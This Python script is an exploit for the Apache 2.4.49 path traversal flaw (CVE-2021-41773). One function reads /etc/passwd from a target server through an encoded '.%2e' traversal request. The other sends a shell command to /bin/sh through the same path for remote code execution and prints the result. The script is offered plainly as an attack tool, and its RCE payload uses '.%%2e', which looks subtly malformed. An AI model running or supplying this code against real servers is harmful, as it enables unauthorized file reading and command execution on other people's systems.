import requests

def check_apache_path_traversal(target):
    if not target.startswith("http"):
        target = "http://" + target

    print(f"[+] Checking Apache 2.4.49 path traversal on {target}")
    payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    try:
        r = requests.get(target + payload, timeout=5)
        if "root:x:" in r.text:
            print("[!!!] Target is vulnerable to CVE-2021-41773 (Path Traversal)")
            return True
    except Exception as e:
        print(f"[!] Error checking: {e}")
    return False

def attempt_rce(target):
    print("[+] Attempting RCE via path traversal...")
    cmd = "id"
    payload = f"/cgi-bin/.%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/bin/sh"
    data = f"echo Content-Type: text/plain; echo; {cmd}"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        r = requests.post(target + payload, data=data, headers=headers, timeout=5)
        print("[*] RCE Output:")
        print(r.text)
    except Exception as e:
        print(f"[!] RCE failed: {e}")